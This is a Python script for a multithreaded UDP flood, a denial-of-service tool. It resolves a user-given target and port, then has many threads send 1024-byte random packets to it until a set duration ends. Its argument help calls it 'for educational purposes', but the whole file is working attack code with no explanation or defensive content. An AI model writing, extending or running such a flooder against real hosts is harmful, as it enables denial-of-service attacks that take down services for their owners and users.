import time
import socket
import sys
import random
import threading
import ipaddress
import os
import argparse

def is_valid_ipv4(ip):
    try:
        ipaddress.IPv4Address(ip)
        return True
    except ipaddress.AddressValueError:
        return False

def run(ip_run, port_run, times_run, threads_run, end_time):
    data_run = random._urandom(1024)

    try:
        while time.time() < end_time:
            s_run = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr_run = (str(ip_run), int(port_run))
            for x_run in range(times_run):
                s_run.sendto(data_run, addr_run)
            s_run.close()

    except KeyboardInterrupt:
        sys.exit(0)
    except:
        sys.exit(0)

def main():
    parser = argparse.ArgumentParser(description="UDP Flooder for educational purposes.")
    parser.add_argument("target", help="Target IP or domain")
    parser.add_argument("port", type=int, help="Target port")
    parser.add_argument("times", type=int, help="Packets per connection")
    parser.add_argument("threads", type=int, help="Number of threads")
    parser.add_argument("duration", type=int, help="Attack duration in seconds")

    args = parser.parse_args()

    target = args.target
    port = args.port
    times = args.times
    threads = args.threads
    duration = args.duration

    if not is_valid_ipv4(target):
        try:
            ip = socket.gethostbyname(target)
        except socket.error:
            sys.exit(1)
    else:
        ip = target

    end_time = time.time() + duration

    for y in range(threads):
        th = threading.Thread(target=run, args=(ip, port, times, threads, end_time))
        th.start()

if __name__ == "__main__":
    main()
